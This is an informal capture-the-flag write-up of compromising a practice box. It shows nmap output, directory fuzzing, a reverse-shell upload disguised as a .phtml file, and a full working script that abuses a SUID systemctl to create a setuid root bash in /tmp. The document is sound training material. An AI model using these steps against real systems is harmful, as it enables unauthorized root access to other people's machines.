This was a fairly simple one
I lost rev shell and had to do it again huhu

nmapped

```
# Nmap 7.80 scan initiated Tue Aug 19 20:06:54 2025 as: nmap -A -Pn -oN nmap 10.201.67.124
Nmap scan report for 10.201.67.124
Host is up (0.27s latency).
Not shown: 992 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          vsftpd 3.0.5
22/tcp   open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open     netbios-ssn  Samba smbd 4.6.2
445/tcp  open     netbios-ssn  Samba smbd 4.6.2
1163/tcp filtered sddp
1259/tcp filtered opennl-voice
3128/tcp open     http-proxy   Squid http proxy 4.10
|_http-server-header: squid/4.10
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open     http         Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-19T14:22:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 19 20:08:01 2025 -- 1 IP address (1 host up) scanned in 67.09 seconds
```

and ffuf'd then found a folder /internal
and recursively did that and found `http://vul.thm:3333/internal/index.php`
and tried a simple revshell script from pentest monke and it works
but changed the file extension to `shell.phtml`

also found `http://vul.thm:3333/internal/uploads`
got in as www-data
and found some suid files on enumeration and used the systemctl one as it said so

using this:
```
cd /tmp

# write malicious service
cat > rootshell.service <<EOF
[Unit]
Description=rootshell

[Service]
Type=simple
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot'

[Install]
WantedBy=multi-user.target
EOF

# tell systemctl (running as root because of SUID) to start it
/bin/systemctl enable /tmp/rootshell.service
/bin/systemctl start rootshell.service

# root shell
/tmp/bashroot -p

```

got root lol ez

